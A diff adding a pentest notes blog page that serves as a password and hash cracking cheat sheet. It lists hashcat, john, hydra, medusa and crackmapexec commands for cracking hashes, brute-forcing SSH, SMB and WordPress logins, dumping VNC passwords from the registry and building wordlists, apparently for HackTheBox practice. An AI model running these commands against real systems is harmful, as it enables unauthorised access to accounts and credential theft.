@@ -1,0 +1,258 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Notes - Password/Hash Cracking // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Notes - Password/Hash Cracking"/>
+<meta name="twitter:description" content="bkcrack: cracking password when some files are known https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack Browser password cracking https://github.com/moonD4rk/HackBrowserData crackmeexec mass brute forcing &gt; crackmapexec ldap -u users.txt -p pass.txt -M laps &lt;target-ip&gt; gpg cracking convert private key to john format &gt; gpg2john creds.priv crack the private key &gt; john --wordlist=/usr/share/wordlists/rockyou.txt gpg.john import to keyring &gt; echo &#34;qwertyuiop&#34; | gpg --batch --yes --allow-secret-key-import --import creds.priv decrypt gpg text &gt; echo &#34;qwertyuiop&#34; | gpg --batch --yes --decrypt --passphrase-fd 0 creds."/>
+
+    <meta property="og:title" content="Notes - Password/Hash Cracking" />
+<meta property="og:description" content="bkcrack: cracking password when some files are known https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack Browser password cracking https://github.com/moonD4rk/HackBrowserData crackmeexec mass brute forcing &gt; crackmapexec ldap -u users.txt -p pass.txt -M laps &lt;target-ip&gt; gpg cracking convert private key to john format &gt; gpg2john creds.priv crack the private key &gt; john --wordlist=/usr/share/wordlists/rockyou.txt gpg.john import to keyring &gt; echo &#34;qwertyuiop&#34; | gpg --batch --yes --allow-secret-key-import --import creds.priv decrypt gpg text &gt; echo &#34;qwertyuiop&#34; | gpg --batch --yes --decrypt --passphrase-fd 0 creds." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/notes/5-passwd-hash-cracking/" /><meta property="article:section" content="notes" />
+<meta property="article:published_time" content="2022-07-06T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-06T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Notes - Password/Hash Cracking</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 6, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="bkcrack-cracking-password-when-some-files-are-known">bkcrack: cracking password when some files are known</h1>
+<ul>
+<li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack">https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack</a></li>
+</ul>
+<h1 id="browser-password-cracking">Browser password cracking</h1>
+<ul>
+<li><a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></li>
+</ul>
+<h1 id="crackmeexec">crackmeexec</h1>
+<ul>
+<li>mass brute forcing</li>
+</ul>
+<pre tabindex="0"><code>&gt; crackmapexec ldap -u users.txt -p pass.txt -M laps &lt;target-ip&gt;
+</code></pre><h1 id="gpg-cracking">gpg cracking</h1>
+<ul>
+<li>convert private key to john format</li>
+</ul>
+<pre tabindex="0"><code>&gt; gpg2john creds.priv
+</code></pre><ul>
+<li>crack the private key</li>
+</ul>
+<pre tabindex="0"><code>&gt; john --wordlist=/usr/share/wordlists/rockyou.txt gpg.john
+</code></pre><ul>
+<li>import to keyring</li>
+</ul>
+<pre tabindex="0"><code>&gt; echo &#34;qwertyuiop&#34; | gpg --batch --yes --allow-secret-key-import --import creds.priv
+</code></pre><ul>
+<li>decrypt gpg text</li>
+</ul>
+<pre tabindex="0"><code>&gt; echo &#34;qwertyuiop&#34; | gpg --batch --yes --decrypt --passphrase-fd 0 creds.txt.gpg
+</code></pre><h1 id="hashcat">hashcat</h1>
+<ul>
+<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></li>
+</ul>
+<blockquote>
+<p>hashcat64.exe -a 0 -m 18200 hash.txt passwordlist.txt</p>
+</blockquote>
+<ul>
+<li>Common use cases</li>
+</ul>
+<pre tabindex="0"><code># sha2-256
+&gt; hashcat.exe -m 1400 hash.txt rockyou.txt
+
+# shadow
+&gt; hashcat.exe -m 1800 -a 0 -o result.txt --remove hash.txt rockyou.txt
+
+# ntlm
+&gt; hashcat.exe --force -m 1000 -r rules\best64.rule hash.txt rockyou.txt --outfile alice.recovered
+
+# wordpress
+&gt; hashcat.exe -m 400 -a 0 hash.txt rockyou.txt
+&gt; pass123:`$P$BNMdSXZIJVPFih/nCL/Tm6eT152wQv0`
+&gt; UPDATE `wp_users` SET `user_pass`=&#39;$P$BNMdSXZIJVPFih/nCL/Tm6eT152wQv0&#39; WHERE user_login=&#39;admin&#39;;
+
+# kdb
+&gt; keepass2john Database.kdb
+&gt; hashcat.exe -a 0 -m 13400 hash.txt rockyou.txt
+
+# apache password
+&gt; hashcat.exe -a 0 -m 1600 hash.txt rockyou.txt
+
+# rar5
+&gt; hashcat64.exe -a 3 -m 13000 hash.txt rockyou.txt
+</code></pre><h1 id="hydra">hydra</h1>
+<ul>
+<li>multi-thread</li>
+</ul>
+<pre tabindex="0"><code>&gt; hydra -t 4 -l hadi -P passwords-mutated.txt &lt;ip&gt; ssh
+</code></pre><ul>
+<li>multiple users, passwords, servers</li>
+</ul>
+<pre tabindex="0"><code>&gt; hydra -L users.txt -P passwords.txt -M servers.txt smb
+</code></pre><ul>
+<li>post form brute force</li>
+</ul>
+<pre tabindex="0"><code>* F=failed is for flag search for failure
+* S=&lt;code&gt; is for status code
+
+&gt; hydra -l root@localhost -P wordlist.txt &lt;ip&gt; http-post-form &#34;/&lt;path-to-login-form&gt;:&lt;req-params&gt;&amp;User=^USER^&amp;Password=^PASS^:F=failed&#34;
+
+# Wordpress examples
+&gt; hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;ip&gt; http-post-form &#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:F=incorrect&#34;
+&gt; proxychains -q hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt &lt;ip&gt; -s 9999 http-post-form &#34;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;testcookie=1:F=incorrect&#34;
+</code></pre><h1 id="known_hosts-cracking">known_hosts cracking</h1>
+<ul>
+<li><a href="https://github.com/chris408/known_hosts-hashcat">https://github.com/chris408/known_hosts-hashcat</a></li>
+</ul>
+<pre tabindex="0"><code># known_hosts in the following format
+|1|hl0YV0IGtl8GWLFNcFuR94BrJxc=|/AFIoup5IaWwtDG9RMEvirDFo9c= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJEd7x32eXrsJKVS9556PvIIKUYXHKwbyMLGpwNKA6vnIXEgYAW9WRtVh2tRgFB33BCNWj/XoMHmeG7iOTu8Gqs=
+
+# convert to hashcat compatible format
+&gt; python3 kh-converter.py known_hosts                                           
+fc0148a2ea7921a5b0b431bd44c12f8ab0c5a3d7:865d18574206b65f0658b14d705b91f7806b2717
+
+# crack
+&gt; hashcat -m 160 --quiet --hex-salt hash.txt -a 3 ipv4_hcmask.txt
+fe21773879e65286ef306151251608165c3e22b3:ed9c2eb01d82af664b63caf7c39062ed28d6a1a1:&lt;ip&gt;
+</code></pre><h1 id="medusa">medusa</h1>
+<pre tabindex="0"><code>&gt; medusa -h portal.windcorp.htb -u admin -p admin -M web-form -m FORM:&#34;/login&#34; -m DENY-SIGNAL:&#34;Wrong credentials&#34; -m FORM-DATA:&#34;username=&amp;password=&#34;
+</code></pre><h1 id="pdf-cracking">pdf cracking</h1>
+<blockquote>
+<p>pdfcrack -f file.pdf -w /usr/share/wordlists/rockyou.txt</p>
+</blockquote>
+<h1 id="virtualbox">virtualbox</h1>
+<ul>
+<li><a href="https://github.com/axcheron/pyvboxdie-cracker">https://github.com/axcheron/pyvboxdie-cracker</a></li>
+<li><a href="https://github.com/hashcat/hashcat/blob/master/tools/virtualbox2hashcat.py">https://github.com/hashcat/hashcat/blob/master/tools/virtualbox2hashcat.py</a></li>
+</ul>
+<h1 id="vnc-cracking">vnc cracking</h1>
+<ul>
+<li>Dump password</li>
+</ul>
+<pre tabindex="0"><code>&gt; reg export &#34;HKLM\Software\TightVNC\Server&#34; foo.reg
+</code></pre><ul>
+<li>Crack using: <a href="https://github.com/trinitronx/vncpasswd.py">https://github.com/trinitronx/vncpasswd.py</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; python vncpasswd.py -d -H 2151d3722874ad0c
+</code></pre><h1 id="wpscan-brute-forcing">wpscan brute-forcing</h1>
+<pre tabindex="0"><code>&gt; wpscan --url http://&lt;ip&gt; -U {user} -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt
+</code></pre><h1 id="zip-files">zip files</h1>
+<blockquote>
+<p>fcrackzip -D -u -p &lsquo;/usr/share/wordlists/rockyou.txt&rsquo; bank-account.zip</p>
+</blockquote>
+<h1 id="wordlist-generation">Wordlist generation</h1>
+<ul>
+<li><code>unshadow</code> the passwd</li>
+</ul>
+<pre tabindex="0"><code>&gt; unshadow passwd shadow
+</code></pre><ul>
+<li><code>cupp</code>: password profiling</li>
+</ul>
+<pre tabindex="0"><code>&gt; cupp -w mutated.txt
+</code></pre><ul>
+<li><code>crunch</code>: generate passwords with prefix</li>
+</ul>
+<pre tabindex="0"><code>&gt; crunch 24 24 -t ThisIsTheUsersPassword%% -o passwords.txt
+</code></pre><ul>
+<li><code>cewl</code>: generate a seed wordlist website (good to use with <code>hydra</code>)</li>
+</ul>
+<pre tabindex="0"><code>&gt; cewl -w secretsec.txt http://&lt;ip&gt;
+</code></pre><ul>
+<li><code>usernamer</code>: generate usernames, use together with <code>smtp-user-enum.pl</code> and <code>cewl</code></li>
+</ul>
+<pre tabindex="0"><code>https://github.com/jseidl/usernamer
+</code></pre><ul>
+<li><code>rsmangler</code>: generate a mangled wordlist from a base list</li>
+</ul>
+<pre tabindex="0"><code>&gt; rsmangler --file base_wordlist.txt --output mangled.txt
+</code></pre><ul>
+<li><code>hashcat</code>: generate wordlist using custom char set</li>
+</ul>
+<pre tabindex="0"><code>&gt; hashcat.exe --force --stdout -a 3 -1 ABCD -2 abcd -3 0123 -4 !@# ?1?12?23?123?1234 &gt; wordlist.txt
+</code></pre><h1 id="common-password-lists">Common password lists</h1>
+<p>/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt
+dirb/wordlists/common.txt
+dict/wordlist-probable.txt
+wfuzz/wordlist/general/megabeast.txt
+sqlmap/data/txt/smalldict.txt
+seclists/Miscellaneous/lang-english.txt
+seclists/Miscellaneous/wordlist-skipfish.fuzz.txt
+seclists/Discovery/DNS/dns-Jhaddix.txt
+seclists/Discovery/Web-Content/common-and-french.txt
+seclists/Discovery/Web-Content/big.txt
+seclists/Discovery/Web-Content/raft-large-words.txt
+seclists/Discovery/Web-Content/common.txt
+seclists/Discovery/Web-Content/common-and-italian.txt
+seclists/Discovery/Web-Content/common-and-spanish.txt
+seclists/Discovery/Web-Content/common-and-portuguese.txt
+seclists/Discovery/Web-Content/raft-large-words-lowercase.txt
+seclists/Passwords/mssql-passwords-nansh0u-guardicore.txt
+seclists/Passwords/bt4-password.txt
+seclists/Passwords/Leaked-Databases/phpbb-cleaned-up.txt
+seclists/Passwords/Leaked-Databases/phpbb.txt
+seclists/Passwords/Software/cain-and-abel.txt
+seclists/Passwords/dutch_common_wordlist.txt
+seclists/Passwords/openwall.net-all.txt
+seclists/Passwords/Honeypot-Captures/multiplesources-passwords-fabian-fingerle.de.txt
+seclists/Passwords/darkc0de.txt
+seclists/Usernames/xato-net-10-million-usernames.txt
+seclists/Usernames/xato-net-10-million-usernames-dup.txt
+wordlists/dirb/common.txt
+wordlists/wfuzz/general/megabeast.txt
+wordlists/rockyou.txt</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
